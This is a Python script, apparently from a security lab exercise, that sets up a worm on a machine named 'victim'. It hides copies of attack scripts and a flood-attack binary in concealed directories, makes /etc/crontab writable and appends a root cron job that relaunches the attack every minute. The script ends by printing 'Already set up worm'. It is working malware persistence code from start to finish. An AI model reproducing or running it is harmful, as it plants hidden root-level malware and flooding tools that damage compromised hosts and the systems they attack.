import os
import sys


attackDirs = ['/home/victim/.etc', '/home/victim/.var']
attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'


def set_ssh_key():
    os.system('')


def set_up_crontab():

    # Write Crontab
    os.system('chmod +w /etc/crontab || ( test )')

    crontab = open('/etc/crontab', 'a')

    crontab.write(attackCommand)
    crontab.write('\n')
    crontab.close()


def set_up_attack():
    if is_set_up_attack():
        return

    # Make directories
    for attackDir in attackDirs:
        os.system('chmod +x TA_Flood_Attack')
        os.system('mkdir {0}'.format(attackDir))
        os.system('mkdir {0}/.module'.format(attackDir))
        os.system('cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
        os.system('cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
        os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))


def is_set_up_attack():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir+attackFile):
                return False

    return True


def is_set_up_crontab():
    # Read Crontab
    os.system('chmod +r /etc/crontab || ( test )')

    crontab = open('/etc/crontab', 'r')

    result = False

    for line in crontab:
        if line.find('Launch_Attack.py') > -1:
            result = True

    crontab.close()

    return result


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':

    # if not is_root():
    #     sys.exit('You must run the script with \'sudo\'')

    set_up_attack()
    set_up_crontab()

    print('Already set up worm in the \'victim\'.')
